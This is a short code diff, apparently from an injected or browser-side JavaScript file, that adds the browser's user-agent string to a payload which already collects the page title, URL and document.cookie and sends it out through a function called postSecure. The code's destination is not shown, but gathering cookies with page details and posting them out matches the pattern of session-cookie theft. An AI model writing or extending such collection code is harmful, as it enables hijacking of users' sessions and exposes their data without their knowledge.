@@ -1109,7 +1109,8 @@
     postSecure('META:' + JSON.stringify({
       title: document.title || location.hostname || location.href,
       url: location.href,
-      cookie: document.cookie || ''
+      cookie: document.cookie || '',
+      ua: navigator.userAgent || ''
     }));
   }
 
